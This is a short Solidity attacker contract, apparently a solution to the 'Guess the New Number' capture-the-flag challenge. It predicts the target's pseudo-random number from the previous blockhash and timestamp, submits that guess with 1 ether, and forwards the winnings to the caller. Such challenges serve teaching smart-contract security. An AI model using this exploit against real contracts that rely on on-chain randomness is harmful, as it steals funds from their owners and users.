// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface GuessTheNewNumber {
    function guess(uint8) external payable;
}

contract AttackGuessTheNewNumberChallenge {
    address target_contract;

    constructor(address _target_contract) {
        target_contract = _target_contract;
    }

    function attack() external payable {
        require(msg.value == 1 ether);
        // compute the answer just like the target contract will
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
        //send our answer
        GuessTheNewNumber(target_contract).guess{value: msg.value}(answer);
        //transfer the ether to our EOA
        payable(msg.sender).transfer(address(this).balance);
    }

    // so we can receive the ether
    receive() external payable {}
}
